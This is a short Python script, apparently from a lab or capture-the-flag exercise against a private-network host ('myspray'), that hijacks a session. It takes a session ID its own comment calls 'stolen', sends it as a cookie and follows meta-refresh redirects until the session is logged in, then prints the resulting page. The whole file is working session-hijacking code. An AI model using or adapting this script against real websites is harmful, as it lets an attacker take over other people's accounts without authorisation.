import sys
import requests
import re

s = requests.Session()

cookie = {"sessionid" : sys.argv[1]} 
baseurl = 'http://10.0.23.22/myspray/'

#request home page with stolen cookies to log in
response = s.get(baseurl + 'start.html', cookies = cookie)

#regex to look for meta redirects
regex = re.compile('<meta[^>]*?url=(.*?)["\']', re.IGNORECASE)

match = regex.search(response.text)

while match: #loop for redirecting until logged in
    response = s.get(baseurl + match.groups()[0].strip(), cookies = cookie)
    match = regex.search(response.text)

print response.text